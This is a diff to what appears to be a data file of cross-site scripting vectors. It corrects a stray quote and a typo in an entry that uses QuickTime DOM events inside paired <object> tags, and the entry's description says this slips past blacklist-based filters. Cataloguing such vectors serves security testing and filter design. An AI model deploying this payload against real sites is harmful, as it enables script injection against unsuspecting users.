@@ -4340,9 +4340,9 @@ var items =
             'cs'    : '',
             'de'    : ''
         },
-        'data'      : '<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>\r\n<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="%js_alert%" " style="behavior:url(#x);"><param name=postdomevents /></object>',
+        'data'      : '<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>\r\n<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="%js_alert%" style="behavior:url(#x);"><param name=postdomevents /></object>',
         'description' : {
-            'en'    : 'The above displayed construct enables usage of the more or less unknown QuickTime DOM events. Those contain anj underscore - which is rather uncommon for event handlers and thus bypasses many blacklist based filters. The attack only works if both <object> tags are in place - and <object> tag 1 supplys the necessary behavior for object tag two.',
+            'en'    : 'The below displayed construct enables usage of the more or less unknown QuickTime DOM events. Those contain an underscore - which is rather uncommon for event handlers and thus bypasses many blacklist based filters. The attack only works if both <object> tags are in place - and <object> tag 1 supplys the necessary behavior for object tag two.',
             'ja'    : '',
             'ru'    : '',
             'cs'    : '',
